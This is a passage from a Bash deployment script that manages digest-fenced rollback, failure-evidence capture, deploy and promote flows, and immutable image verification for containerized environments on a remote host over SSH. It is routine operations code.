  candidate_digest="${ACX_CANDIDATE_DIGEST_REF:-}"
  if [[ ! "${candidate_digest}" =~ ^[A-Za-z0-9_.:/-]+@sha256:[a-f0-9]{64}$ ]]; then
    if [[ "${restart_runtime}" == "1" ]]; then
      warn "ROLLBACK REQUIRED but no candidate generation was captured; refusing unfenced runtime rollback"
      return 1
    fi
    candidate_digest=""
    candidate_base=""
  else
    candidate_base="${candidate_digest%@sha256:*}"
  fi
  assert_safe_image_repo "rollback image repository" "${rollback_base}"
  env_tag="$(env_to_tag "${env}")"
  timeout="${ACX_PUSH_TIMEOUT:-900}"
  inspect_timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
  if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
    warn "ACX_PUSH_TIMEOUT must be a positive integer (got: ${timeout})"
    return 1
  fi
  if ! _pull_ref_remote "${ACX_ROLLBACK_DIGEST_REF}" >/dev/null; then
    warn "rollback digest pull failed for ${ACX_ROLLBACK_DIGEST_REF}"
    return 1
  fi
  pulled_digest="$(remote_image_digest_ref "${ACX_ROLLBACK_DIGEST_REF}" || true)"
  if [[ "${pulled_digest}" != "${ACX_ROLLBACK_DIGEST_REF}" ]]; then
    warn "ROLLBACK DIGEST MISMATCH: expected ${ACX_ROLLBACK_DIGEST_REF}, got ${pulled_digest:-empty}"
    return 1
  fi

  # Fence automatic compensation against a newer deployment. The mutable tag
  # may only be changed when its registry mapping is still this transaction's
  # candidate (or is already the rollback digest after an idempotent retry).
  if [[ -n "${candidate_digest}" ]]; then
    if ! _pull_ref_remote "${rollback_base}:${env_tag}" >/dev/null \
      || ! current_digest="$(remote_image_digest_ref "${rollback_base}:${env_tag}")"; then
      warn "cannot observe current registry mapping for ${rollback_base}:${env_tag}; refusing unfenced rollback"
      return 1
    fi
    if [[ "${current_digest}" != "${ACX_ROLLBACK_DIGEST_REF}" ]]; then
      if [[ "${candidate_base}" != "${rollback_base}" || "${current_digest}" != "${candidate_digest}" ]]; then
        warn "STALE ROLLBACK REFUSED: ${rollback_base}:${env_tag} now maps to ${current_digest}, not this transaction's ${candidate_digest}"
        return 1
      fi
    fi
  fi
  if [[ "${restart_runtime}" == "1" ]]; then
    if ! rollback_image_id="$(remote_image_id_for_digest "${ACX_ROLLBACK_DIGEST_REF}")" \
      || ! candidate_image_id="$(remote_image_id_for_digest "${candidate_digest}")"; then
      warn "cannot resolve immutable candidate/rollback image IDs; refusing unfenced rollback"
      return 1
    fi
    if ! runtime_evidence="$(read_api_runtime_evidence "${env}")"; then
      warn "ROLLBACK REQUIRED but api runtime inspection is unknown; refusing unfenced rollback"
      return 1
    fi
    if [[ "${runtime_evidence}" == "ABSENT" ]]; then
      warn "ROLLBACK REQUIRED but no stopped api container proves this transaction's candidate generation"
      return 1
    fi
    while IFS='|' read -r runtime_kind runtime_cid runtime_image_id runtime_state \
      runtime_project runtime_service runtime_hash; do
      # Compose scoping plus these labels make the stopped record an identity
      # proof, rather than merely an unrelated container with the same image.
      case "${runtime_kind}:${runtime_state}" in
        RUNNING:running|RUNNING:restarting|STOPPED:created|STOPPED:exited|STOPPED:dead) ;;
        *) continue ;;
      esac
      if [[ "${runtime_project}" != "acx-${env}" \
        || "${runtime_service}" != "api" \
        || -z "${runtime_hash}" ]]; then
        continue
      fi
      case "${runtime_kind}" in
        RUNNING)
          if [[ "${runtime_image_id}" == "${candidate_image_id}" \
            || "${runtime_image_id}" == "${rollback_image_id}" ]]; then
            runtime_owner="running"
          fi
          ;;
        STOPPED)
          # A stopped candidate container is the positive evidence that the
          # failed restart reached this transaction's generation. A stopped
          # rollback container is accepted only after the registry is already
          # on the rollback digest, making an idempotent retry safe.
          if [[ "${runtime_image_id}" == "${candidate_image_id}" ]]; then
            runtime_owner="stopped-candidate"
          elif [[ "${runtime_image_id}" == "${rollback_image_id}" \
            && "${current_digest}" == "${ACX_ROLLBACK_DIGEST_REF}" ]]; then
            runtime_owner="stopped-rollback"
          fi
          ;;
      esac
      [[ -n "${runtime_owner}" ]] && break
    done <<< "${runtime_evidence}"
    if [[ -z "${runtime_owner}" ]]; then
      warn "STALE ROLLBACK REFUSED: ${env} runtime generation is outside this transaction's candidate/rollback fence"
      return 1
    fi
    if [[ "${runtime_owner}" == "stopped-candidate" ]]; then
      log "Confirmed stopped api container ${runtime_cid:0:12} belongs to the candidate generation; proceeding with rollback"
    fi
  fi

  if ! run_with_deadline "${inspect_timeout}" "rollback VM-local retag for ${env}" \
    remote_docker_with_config tag "${ACX_ROLLBACK_DIGEST_REF}" "${rollback_base}:${env_tag}"; then
    warn "could not restore VM-local ${rollback_base}:${env_tag}"
    return 1
  fi
  if ! run_with_deadline "${timeout}" "rollback push of ${rollback_base}:${env_tag}" \
    remote_docker_with_config push "${rollback_base}:${env_tag}"; then
    warn "could not restore registry tag ${rollback_base}:${env_tag}"
    return 1
  fi
  if [[ "${restart_runtime}" == "1" ]]; then
    unit="$(env_to_unit "${env}")"
    # Sticky repository state participates in compose image resolution, so it
    # must be compensated before restart, not afterward.
    if ! restore_prior_image_repo_env; then
      warn "could not restore prior ACX_IMAGE_REPO before rollback restart"
      return 1
    fi
    if ! run_with_deadline "${inspect_timeout}" "rollback systemctl restart ${unit}" \
      ssh -l "${OCI_USER}" -- "${OCI_HOST}" "sudo systemctl restart $(remote_quote "${unit}")"; then
      warn "could not restart ${unit} on the restored image"
      return 1
    fi
    if ! verify_restored_runtime "${env}" "${ACX_ROLLBACK_DIGEST_REF}"; then
      warn "rollback restart completed but healthy serving state was not observed"
      return 1
    fi
  fi
  log "Restored ${rollback_base}:${env_tag} to ${ACX_ROLLBACK_DIGEST_REF}"
}

rollback_command_hint() {
  local env="$1"
  if [[ -n "${ACX_ROLLBACK_TAG:-}" ]]; then
    printf '%s rollback %s %s' "$0" "${env}" "${ACX_ROLLBACK_TAG#rollback-}"
  else
    printf '%s rollback %s <rollback-id>' "$0" "${env}"
  fi
}

do_rollback() {
  local env="$1" rollback_id="$2" rollback_ref digest env_tag current_digest
  if [[ ! "${rollback_id}" =~ ^[a-f0-9]{12}$ ]]; then
    fail "rollback id must be the 12-character digest prefix printed by a failed deployment"
  fi
  if [[ "${env}" == "prod" && "${CONFIRM:-}" != "PROMOTE" ]]; then
    fail "Production rollback requires CONFIRM=PROMOTE"
  fi
  init_deploy_ocir_docker_config
  preflight_ssh
  preflight_remote_ocir_auth
  rollback_ref="${IMAGE_BASE}:rollback-${rollback_id}"
  _pull_ref_remote "${rollback_ref}"
  digest="$(remote_image_digest_ref "${rollback_ref}")" \
    || fail "Rollback tag ${rollback_ref} could not be inspected"
  if [[ ! "${digest}" =~ ^${IMAGE_BASE}@sha256:${rollback_id}[a-f0-9]{52}$ ]]; then
    fail "Rollback tag ${rollback_ref} did not resolve to a valid digest"
  fi
  ACX_ROLLBACK_DIGEST_REF="${digest}"
  ACX_ROLLBACK_IMAGE_BASE="${IMAGE_BASE}"
  env_tag="$(env_to_tag "${env}")"
  # Manual rollback has no build candidate, so snapshot the current registry
  # generation and pass it through the same stale-tag fence as automatic
  # compensation. An unreadable/empty mapping is unknown, never permission to
  # overwrite the environment tag.
  _pull_ref_remote "${IMAGE_BASE}:${env_tag}" \
    || fail "Current ${IMAGE_BASE}:${env_tag} could not be pulled; refusing unfenced rollback"
  current_digest="$(remote_image_digest_ref "${IMAGE_BASE}:${env_tag}")" \
    || fail "Current ${IMAGE_BASE}:${env_tag} mapping could not be inspected; refusing unfenced rollback"
  if [[ ! "${current_digest}" =~ ^${IMAGE_BASE}@sha256:[a-f0-9]{64}$ ]]; then
    fail "Current ${IMAGE_BASE}:${env_tag} mapping is invalid; refusing unfenced rollback"
  fi
  ACX_CANDIDATE_DIGEST_REF="${current_digest}"
  restore_env_tag_to_rollback "${env}" 1 \
    || fail "Rollback failed; ${IMAGE_BASE}:${env_tag} outcome is unknown"
  # restore_env_tag_to_rollback already requires both /health and immutable
  # image-ID evidence. GIT_REF may intentionally differ from the old rollback
  # commit, so a current-GIT_REF do_verify here would reject a healthy rollback.
}

# Capture the live failure state before automatic rollback replaces the serving
# container. Phase selects the probe set:
#   pre_candidate — push/tag failed before the candidate container started.
#                   Skip HTTP probes of the PRIOR image; collect scoped
#                   docker ps / compose state and a 'candidate never started' line.
#   post_restart  — systemctl restart was issued. Keep api logs; skip /health
#                   and /ready (those may still be the prior image).
#   candidate     — the candidate ran (verify failed). Probe loopback Caddy
#                   /health + /ready (host port 443, env Host/SNI) and api logs.
# Evidence is diagnostic only: every remote call is deadline-bounded and a
# failed probe is warned about without blocking the rollback that follows.
capture_failure_evidence() {
  local env="$1" phase="${2:-candidate}"
  local remote_dir compose_files remote_dir_q timeout evidence=""
  local health_url ready_url health_host health_url_q ready_url_q health_host_q
  local cid cid_q cid_raw cid_err cid_trimmed
  remote_dir="$(env_to_remote_dir "${env}")"
  compose_files="$(env_to_compose_files "${env}")"
  remote_dir_q="$(remote_quote "${remote_dir}")"
  log "failure evidence compose project: grep -m1 ^COMPOSE_PROJECT_NAME= ${remote_dir}/.env (fallback acx-${env})"
  timeout="$(validated_deadline ACX_EVIDENCE_TIMEOUT 30)" || {
    warn "failure evidence skipped for ${env}; ACX_EVIDENCE_TIMEOUT must be a positive integer (got: ${ACX_EVIDENCE_TIMEOUT:-})"
    return 0
  }

  case "${phase}" in
    pre_candidate|post_restart|candidate) ;;
    *)
      warn "failure evidence unknown phase '${phase}' for ${env}; skipping HTTP probes of the prior image"
      phase="pre_candidate"
      ;;
  esac

  if [[ "${phase}" == "pre_candidate" || "${phase}" == "post_restart" ]]; then
    if [[ "${phase}" == "pre_candidate" ]]; then
      printf '%s\n' "candidate never started" >&2
    fi
    printf 'environment: %s\n' "${env}" >&2
    printf '%s\n' "--- evidence: docker ps / compose ---" >&2
    evidence=""
    # shellcheck disable=SC2086 # compose_files is intentionally word-split (-f a -f b).
    if ! evidence="$(run_with_deadline "${timeout}" "failure evidence compose/ps for ${env}" \
      ssh -n -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
        -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
        -l "${OCI_USER}" -- "${OCI_HOST}" \
        "cd ${remote_dir_q} && compose_project=\$(grep -m1 '^COMPOSE_PROJECT_NAME=' ${remote_dir_q}/.env | cut -d= -f2- | tr -d \"\\\"' \") && compose_project=\${compose_project:-acx-${env}} && echo compose_project=\$compose_project && docker compose ${compose_files} ps; docker ps --filter label=com.docker.compose.project=\"\$compose_project\" --format '{{.ID}} {{.Names}} {{.Status}}'" 2>&1)"; then
      warn "failure evidence compose/ps capture failed for ${env}; continuing with rollback"
    fi
    emit_sanitized_evidence "${evidence}"
    if [[ "${phase}" == "pre_candidate" ]]; then
      return 0
    fi
  fi

  if [[ "${phase}" == "candidate" ]]; then
    health_url="$(env_to_health_url "${env}")"
    ready_url="$(env_to_ready_url "${env}")"
    health_host="${health_url#https://}"
    health_host="${health_host%%/*}"
    health_url_q="$(remote_quote "${health_url}")"
    ready_url_q="$(remote_quote "${ready_url}")"
    health_host_q="$(remote_quote "${health_host}")"

    printf '%s\n' "--- evidence: /health ---" >&2
    printf 'environment: %s\n' "${env}" >&2
    evidence=""
    if ! evidence="$(run_with_deadline "${timeout}" "failure evidence /health for ${env}" \
      ssh -n -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
        -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
        -l "${OCI_USER}" -- "${OCI_HOST}" \
        "curl -sS --max-time 10 --resolve ${health_host_q}:443:127.0.0.1 --write-out '\\nHTTP_CODE=%{http_code}' ${health_url_q}" 2>&1)"; then
      warn "failure evidence /health probe failed for ${env}; continuing with rollback"
    fi
    emit_sanitized_evidence "${evidence}"

    printf '%s\n' "--- evidence: /ready ---" >&2
    printf 'environment: %s\n' "${env}" >&2
    evidence=""
    if ! evidence="$(run_with_deadline "${timeout}" "failure evidence /ready for ${env}" \
      ssh -n -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
        -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
        -l "${OCI_USER}" -- "${OCI_HOST}" \
        "curl -sS --max-time 10 --resolve ${health_host_q}:443:127.0.0.1 --write-out '\\nHTTP_CODE=%{http_code}' ${ready_url_q}" 2>&1)"; then
      warn "failure evidence /ready probe failed for ${env}; continuing with rollback"
    fi
    emit_sanitized_evidence "${evidence}"
  fi

  printf '%s\n' "--- evidence: api container logs ---" >&2
  printf 'environment: %s\n' "${env}" >&2
  evidence=""
  cid=""
  cid_err="$(mktemp)"
  # Keep ssh stderr off the cid parse: a trailing host-key/motd/compose warning
  # must not replace a valid hex id (and skip docker logs). Sanitize stderr so
  # secrets still never reach the log unprefixed.
  # shellcheck disable=SC2086 # compose_files is intentionally word-split (-f a -f b).
  if ! cid="$(run_with_deadline "${timeout}" "failure evidence api cid for ${env}" \
    ssh -n -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
      -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
      -l "${OCI_USER}" -- "${OCI_HOST}" \
      "cd ${remote_dir_q} && docker compose ${compose_files} ps -q api 2>/dev/null" \
      2>"${cid_err}")"; then
    warn "failure evidence api cid capture failed for ${env}; continuing with rollback"
  fi
  if [[ -s "${cid_err}" ]]; then
    if ! sanitize_deploy_diagnostic < "${cid_err}" >&2; then
      echo "diagnostic: cid capture stderr unavailable" >&2
    fi
  fi
  rm -f "${cid_err}"
  cid_raw="${cid}"
  cid="$(printf '%s\n' "${cid}" | awk '{ sub(/\r$/,""); gsub(/^[ \t]+|[ \t]+$/,""); } /^[0-9a-fA-F]{64}$/ { id=tolower($0) } END { if (id) print id }')"
  cid_trimmed="$(printf '%s' "${cid_raw}" | tr -d '[:space:]')"
  if [[ -n "${cid}" && "${cid}" =~ ^[0-9a-f]{64}$ ]]; then
    cid_q="$(remote_quote "${cid}")"
    if ! evidence="$(run_with_deadline "${timeout}" "failure evidence api logs for ${env}" \
      ssh -n -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
        -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
        -l "${OCI_USER}" -- "${OCI_HOST}" \
        "docker logs --tail 80 ${cid_q}" 2>&1)"; then
      warn "failure evidence api log capture failed for ${env}; continuing with rollback"
    fi
  elif [[ -n "${cid_trimmed}" ]]; then
    if ! printf '%s\n' "unexpected container id output: ${cid_raw}" | sanitize_deploy_diagnostic >&2; then
      echo "diagnostic: unexpected container id output unavailable" >&2
    fi
    evidence=""
  else
    evidence="no api container"
  fi
  emit_sanitized_evidence "${evidence}"
  return 0
}

# Shared by do_deploy / do_promote. ACX_VERIFY_OPTIONAL may warn only after a
# successful runtime rollback; a failed rollback stays fail-closed.
handle_failed_verification() {
  local env="$1" label="$2"
  local rollback_ok=0
  capture_failure_evidence "$env" candidate || warn "automatic failure evidence capture failed; continuing with rollback"
  if restore_env_tag_to_rollback "$env" 1; then
    rollback_ok=1
  else
    rollback_ok=0
    warn "automatic runtime rollback failed; run: $(rollback_command_hint "$env")"
  fi
  if [[ "$rollback_ok" == "1" && "${ACX_VERIFY_OPTIONAL:-0}" == "1" ]]; then
    warn "Verify failed but ACX_VERIFY_OPTIONAL=1; previous image restored. Recovery: $(rollback_command_hint "$env")"
  elif [[ "$rollback_ok" == "1" ]]; then
    fail "${label} verification failed; previous image restored where possible. Recovery: $(rollback_command_hint "$env")"
  else
    fail "${label} verification failed AND automatic rollback failed; runtime state unknown. Recovery: $(rollback_command_hint "$env")"
  fi
}

#---------------------------------------------------------------- deploy
do_deploy() {
  local env="$1"; shift || true
  local check=0
  [[ "${1:-}" == "--check" ]] && check=1

  # Read-only drift check bypasses build/push and the promote confirmation.
  if (( check )); then
    env_to_remote_dir "$env" >/dev/null   # validate env before any network
    preflight_ssh
    converge_check "$env"
    return 0
  fi

  init_deploy_ocir_docker_config

  local tag sha
  tag="$(env_to_tag "$env")"
  sha="$(git -C "${REPO_ROOT}" rev-parse "${GIT_REF}")"

  if [[ "$env" == "prod" && "${CONFIRM:-}" != "PROMOTE" ]]; then
    fail "Production deploy requires CONFIRM=PROMOTE. Re-run: CONFIRM=PROMOTE $0 deploy prod"
  fi

  preflight_ssh
  preflight_remote_face_pipeline_models "$env"
  preflight_git_clean "$env"
  preflight_branch_synced "$env"

  # Snapshot and publish the previous-good digest before building the candidate.
  # Remote builds only tag the SHA; the environment tag changes after smoke.
  preflight_remote_ocir_auth
  preserve_rollback_tag "$env"

  if [[ "${REMOTE_BUILD}" == "1" ]]; then
    log "Mode: remote-build (${SSH_TARGET}, no local docker required)"
    do_build_remote "$tag"
  else
    do_build "$tag"
  fi

  # Push :SHA first, gate on the boot smoke, and only then promote the env tag
  # (e.g. :latest) so a failed smoke never poisons the promotion tag in OCIR.
  do_push_sha
  promote_gate "$env" "${ACX_CANDIDATE_DIGEST_REF}"
  # S2-A-06: if tag promotion fails after ship, restore prior sticky repo.
  if ! do_push_tag "$tag" "${ACX_CANDIDATE_DIGEST_REF}"; then
    capture_failure_evidence "$env" pre_candidate || warn "automatic failure evidence capture failed; continuing with rollback"
    if restore_env_tag_to_rollback "$env" 0; then
      restore_prior_image_repo_env || warn "env tag restored but prior sticky repository restore failed"
    else
      warn "automatic env-tag restore failed; refusing further unfenced compensation; run: $(rollback_command_hint "$env")"
    fi
    fail "Push of env tag failed after shipping ACX_IMAGE_REPO. Recovery: $(rollback_command_hint "$env")"
  fi

  if ! do_restart "$env" "${ACX_CANDIDATE_DIGEST_REF}"; then
    capture_failure_evidence "$env" "${ACX_RESTART_EVIDENCE_PHASE:-pre_candidate}" || warn "automatic failure evidence capture failed; continuing with rollback"
    local restart_runtime=0
    if [[ "${ACX_RESTART_EVIDENCE_PHASE:-pre_candidate}" == "post_restart" ]]; then
      restart_runtime=1
    fi
    if restore_env_tag_to_rollback "$env" "${restart_runtime}"; then
      restore_prior_image_repo_env || warn "env tag restored but prior sticky repository restore failed"
    else
      warn "automatic env-tag restore failed; refusing further unfenced compensation; run: $(rollback_command_hint "$env")"
    fi
    fail "Restart failed; the previous env tag was restored where possible. Recovery: $(rollback_command_hint "$env")"
  fi

  log "Deploy submitted. Verifying..."
  # S2-A-04: deploy path uses local resolve as authority (not the remote .env
  # we just wrote — that comparison would be tautological).
  if ! ACX_VERIFY_EXPECT_LOCAL=1 do_verify "$env"; then
    handle_failed_verification "$env" "Deploy"
  fi
}

#---------------------------------------------------------------- promote
do_promote() {
  local from_env="$1" to_env="$2"
  init_deploy_ocir_docker_config
  # Fail closed: dev-fir shares the :dev image tag with acx-dev (env_to_tag maps
  # both to "dev"). Promoting to dev-fir would retag the SHARED :dev image and
  # only restart acx-dev-fir — blast radius onto acx-dev identity, incomplete
  # apply (gate r08117ab7 RA-01/RB-03/RC-02). Mirror mk/deploy.mk's
  # deploy-rollback-dev-fir refusal; name the real lever.
  if [[ "$to_env" == "dev-fir" ]]; then
    printf '%sxx%s %s\n' "${RED}" "${RESET}" \
      "promote: refused. to_env=dev-fir shares the :dev image tag with acx-dev; a FIR-only image promote/retag does not exist. To retag the shared :dev image for BOTH stacks, run '$0 promote ${from_env} dev' or 'make deploy-rollback-dev' (and restart acx-dev-fir afterwards)." >&2
    exit 2
  fi
  local from_tag to_tag
  from_tag="$(env_to_tag "$from_env")"
  to_tag="$(env_to_tag "$to_env")"

  preflight_ssh
  # Face-pipeline weights must exist before we re-point the to_env runtime (C-02).
  preflight_remote_face_pipeline_models "$to_env"

  if [[ "$to_env" == "prod" && "${CONFIRM:-}" != "PROMOTE" ]]; then
    fail "Production promotion requires CONFIRM=PROMOTE. Re-run: CONFIRM=PROMOTE $0 promote $from_env $to_env"
  fi

  preflight_remote_ocir_auth
  preserve_rollback_tag "$to_env"

  # Pull the source image so the boot smoke can run it before it is promoted.
  if [[ "${REMOTE_BUILD}" == "1" ]]; then
    log "Mode: remote-retag (${SSH_TARGET})"
    preflight_remote_docker
    preflight_remote_ocir_auth
    # A-11: promote remote branch materialises layers — same free-space floor.
    assert_remote_disk_headroom_for_pull
    log "Pulling source image ${IMAGE_BASE}:${from_tag} on ${SSH_TARGET}"
    _pull_ref "${IMAGE_BASE}:${from_tag}"
  else
    preflight_docker
    preflight_ocir_auth
    log "Pulling source image ${IMAGE_BASE}:${from_tag}"
    _pull_ref "${IMAGE_BASE}:${from_tag}"
  fi
  ACX_CANDIDATE_DIGEST_REF="$(image_digest_ref "${IMAGE_BASE}:${from_tag}")" \
    || fail "Could not capture digest for promotion source ${IMAGE_BASE}:${from_tag}"

  # Same safety gate as deploy: boot-smoke the source image + converge compose/
  # unit after rollback was captured, then retag exactly the digest that passed.
  promote_gate "$to_env" "${ACX_CANDIDATE_DIGEST_REF}"

  if ! do_push_tag "$to_tag" "${ACX_CANDIDATE_DIGEST_REF}"; then
    capture_failure_evidence "$to_env" pre_candidate || warn "automatic failure evidence capture failed; continuing with rollback"
    if restore_env_tag_to_rollback "$to_env" 0; then
      restore_prior_image_repo_env || warn "env tag restored but prior sticky repository restore failed"
    else
      warn "automatic env-tag restore failed; refusing further unfenced compensation; run: $(rollback_command_hint "$to_env")"
    fi
    fail "Promotion tag/push failed. Recovery: $(rollback_command_hint "$to_env")"
  fi

  if ! do_restart "$to_env" "${ACX_CANDIDATE_DIGEST_REF}"; then
    capture_failure_evidence "$to_env" "${ACX_RESTART_EVIDENCE_PHASE:-pre_candidate}" || warn "automatic failure evidence capture failed; continuing with rollback"
    local restart_runtime=0
    if [[ "${ACX_RESTART_EVIDENCE_PHASE:-pre_candidate}" == "post_restart" ]]; then
      restart_runtime=1
    fi
    if restore_env_tag_to_rollback "$to_env" "${restart_runtime}"; then
      restore_prior_image_repo_env || warn "env tag restored but prior sticky repository restore failed"
    else
      warn "automatic env-tag restore failed; refusing further unfenced compensation; run: $(rollback_command_hint "$to_env")"
    fi
    fail "Restart failed; previous env tag restored where possible. Recovery: $(rollback_command_hint "$to_env")"
  fi

  log "Promotion submitted. Verifying..."
  if ! ACX_VERIFY_EXPECT_LOCAL=1 do_verify "$to_env"; then
    handle_failed_verification "$to_env" "Promotion"
  fi
}

#---------------------------------------------------------------- verify
# Read the running api container's Config.Image from the remote host (rg-015).
# Returns the raw reference on stdout; empty on inspect failure.
read_running_api_image() {
  local env="$1" remote_dir compose_files remote_dir_q timeout
  remote_dir="$(env_to_remote_dir "$env")"
  compose_files="$(env_to_compose_files "$env")"
  remote_dir_q="$(remote_quote "${remote_dir}")"
  timeout="${ACX_REMOTE_INSPECT_TIMEOUT:-60}"
  if [[ ! "${timeout}" =~ ^[1-9][0-9]*$ ]]; then
    fail "ACX_REMOTE_INSPECT_TIMEOUT must be a positive integer (got: ${timeout})"
  fi
  # shellcheck disable=SC2086 # compose_files is intentionally word-split (-f a -f b).
  run_with_deadline "${timeout}" "running image reference inspection for ${env}" \
    ssh -o BatchMode=yes -o ConnectTimeout=10 -o ConnectionAttempts=1 \
      -o ServerAliveInterval=15 -o ServerAliveCountMax=3 \
      -l "${OCI_USER}" -- "${OCI_HOST}" \
      "cd ${remote_dir_q} && cid=\$(docker compose ${compose_files} ps -q api 2>/dev/null | head -1) && \
       [ -n \"\$cid\" ] && docker inspect --format '{{.Config.Image}}' \"\$cid\"" 2>/dev/null
}

# Read remote .env ACX_IMAGE_REPO (empty if unset). Charset-validated when present.
# S2-A-05: never call fail() inside this function when used from command
# substitution — fail() would only kill the subshell and the caller’s `|| true`
# would swallow it. On validation failure print sentinel __INVALID_REPO__ and
# return 2 so callers fail closed.
# D10: standalone `verify` against a VLM deploy must use the shipped sticky repo,
# not the local default recognition resolve, so operators need not re-export
# ACX_BUILD_TARGET=runtime-vlm just to verify.
read_remote_image_repo() {
  local env="$1" remote_dir raw timeout rc=0
  remote_dir="$(env_to_remote_dir "$env")"
  timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)"
  raw="$(run_with_deadline "${timeout}" "remote ACX_IMAGE_REPO read for ${env}" \
    ssh -o BatchMode=yes -o ConnectTimeout=10 -l "${OCI_USER}" -- "${OCI_HOST}" \
      "f='${remote_dir}/.env'; \
       if sudo test -f \"\$f\" 2>/dev/null; then sudo grep -E '^ACX_IMAGE_REPO=' \"\$f\" 2>/dev/null | tail -1 | cut -d= -f2-; \
       elif test -f \"\$f\"; then grep -E '^ACX_IMAGE_REPO=' \"\$f\" 2>/dev/null | tail -1 | cut -d= -f2-; fi" \
      2>/dev/null)" || rc=$?
  (( rc == 0 )) || return "${rc}"
  raw="$(printf '%s' "${raw}" | tr -d "\"' \r")"
  if [[ -n "${raw}" ]]; then
    if [[ ! "${raw}" =~ ^[A-Za-z0-9_.:/-]+$ ]]; then
      printf '%s\n' "__INVALID_REPO__"
      return 2
    fi
    printf '%s\n' "${raw}"
  fi
}

# Expected image_variant label for the current local resolve (HARM-A-04).
# recognition when empty; vlm when ACX_BUILD_TARGET matches *vlm* or variant=vlm.
expected_image_variant() {
  if is_vlm_smoke_budget; then
    printf '%s\n' "vlm"
  else
    printf '%s\n' "recognition"
  fi
}

# Derive variant from an image repository path (*-vlm → vlm).
variant_from_image_repo() {
  local repo="$1"
  case "${repo}" in
    *-vlm) printf '%s\n' "vlm" ;;
    *)     printf '%s\n' "recognition" ;;
  esac
}

# Compare live container image repo to expected (return 1 on mismatch — never
# call fail/exit here so `if ! do_verify` and ACX_VERIFY_OPTIONAL=1 work — D10).
# S2-A-04: local resolve is authoritative when the operator set a variant selector
# OR when ACX_VERIFY_EXPECT_LOCAL=1 (deploy/promote path). Remote .env is only
# consulted for bare standalone `verify` so VLM recovery works without re-export.
verify_running_image_matches_deployed() {
  local env="$1" env_tag expected_repo expected_ref running_image remote_repo source_note repo_rc=0
  local expected_digest running_image_id expected_image_id
  env_tag="$(env_to_tag "$env")"
  remote_repo="$(read_remote_image_repo "$env")" || repo_rc=$?
  if (( repo_rc != 0 )); then
    warn "IMAGE VERIFY: remote ACX_IMAGE_REPO state is unknown on ${env} (read exit ${repo_rc})"
    return 1
  fi
  if [[ "${remote_repo}" == "__INVALID_REPO__" ]]; then
    warn "IMAGE VERIFY: remote ACX_IMAGE_REPO on ${env} failed charset validation (fail-closed)"
    return 1
  fi
  if [[ "${ACX_VERIFY_EXPECT_LOCAL:-0}" == "1" \
     || -n "${ACX_BUILD_TARGET:-}" \
     || -n "${ACX_IMAGE_VARIANT:-}" ]]; then
    expected_repo="${ACX_IMAGE_REPO}"
    source_note="local resolve"
  elif [[ -n "${remote_repo}" ]]; then
    expected_repo="${remote_repo}"
    source_note="remote .env"
  else
    expected_repo="${ACX_IMAGE_REPO}"
    source_note="local resolve (no remote key)"
  fi
  if [[ ! "${expected_repo}" =~ ^[A-Za-z0-9_.:/-]+$ ]]; then
    warn "IMAGE VERIFY: expected image repo failed charset validation: ${expected_repo}"
    return 1
  fi
  expected_ref="${expected_repo}:${env_tag}"
  running_image="$(read_running_api_image "$env" || true)"
  if [[ -z "${running_image}" ]]; then
    warn "IMAGE VERIFY: could not read running api Config.Image on ${env} (container missing?)"
    return 1
  fi
  # Accept tag form (repo:tag) or digest form (repo@sha256:...) under expected_repo.
  case "${running_image}" in
    "${expected_repo}:"*|"${expected_repo}"@*)
      ;;
    *)
      # Loud mismatch — silent success with the wrong repo was the VLM deploy bug.
      # return (not fail/exit) so callers can honor ACX_VERIFY_OPTIONAL.
      warn "IMAGE MISMATCH: ${env} running container image is '${running_image}', expected repository '${expected_repo}' via ${source_note} (deployed as ${expected_ref}). Variant deploys must not silently run a different repo."
      return 1
      ;;
  esac

  # Repo/tag and commit labels are not immutable identity. During deploy,
  # promote, and rollback, compare the serving container's image ID with the ID
  # resolved from the exact digest that crossed the smoke/rollback fence.
  expected_digest="${ACX_CANDIDATE_DIGEST_REF:-${ACX_ROLLBACK_DIGEST_REF:-}}"
  if [[ "${ACX_VERIFY_EXPECT_LOCAL:-0}" == "1" ]]; then
    if [[ ! "${expected_digest}" =~ ^${expected_repo}@sha256:[a-f0-9]{64}$ ]]; then
      warn "IMMUTABLE IMAGE VERIFY: no valid expected digest for ${env}"
      return 1
    fi
    running_image_id="$(read_running_api_image_id "${env}" || true)"
    expected_image_id="$(remote_image_id_for_digest "${expected_digest}" || true)"
    if [[ -z "${running_image_id}" || "${running_image_id}" != "${expected_image_id}" ]]; then
      warn "IMMUTABLE IMAGE MISMATCH: ${env} serves ${running_image_id:-unknown}, expected ${expected_image_id:-unknown} from ${expected_digest}"
      return 1
    fi
  fi
  log "Image verified: ${env} running ${running_image} (repo matches ${expected_repo} via ${source_note}; immutable_digest=${expected_digest:-not-required})"
  return 0
}

verify_retry_sleep() {
  local attempt="$1" max_attempts="$2" base="$3" jitter delay
  (( attempt < max_attempts )) || return 0
  if (( base == 0 )); then
    return 0
  fi
  jitter=$((RANDOM % (base / 2 + 1)))
  delay=$((base + jitter))
  sleep "${delay}"
}

verify_live_gpu_snapshots() {
  local env="$1" remote_dir payload expected_bytes expected_sha gate_timeout transport_rc=0
  remote_dir="$(env_to_remote_dir "$env")"
  gate_timeout="${ACX_GPU_SNAPSHOT_GATE_TIMEOUT_SECONDS:-60}"
  if ! [[ "${gate_timeout}" =~ ^[1-9][0-9]*$ ]]; then
    fail "ACX_GPU_SNAPSHOT_GATE_TIMEOUT_SECONDS must be a positive integer (got: ${gate_timeout})"
  fi
  command -v timeout >/dev/null 2>&1 || fail "timeout command is required for GPU snapshot verification"
  log "Verifying live GPU snapshot contract on ${SSH_TARGET} (${env})"
  payload="$(mktemp)"
  if ! {
    paste -sd, "${SCRIPT_DIR}/gpu-snapshot-deployments.conf"
    cat "${SCRIPT_DIR}/check-gpu-snapshots.sh"
  } >"${payload}"; then
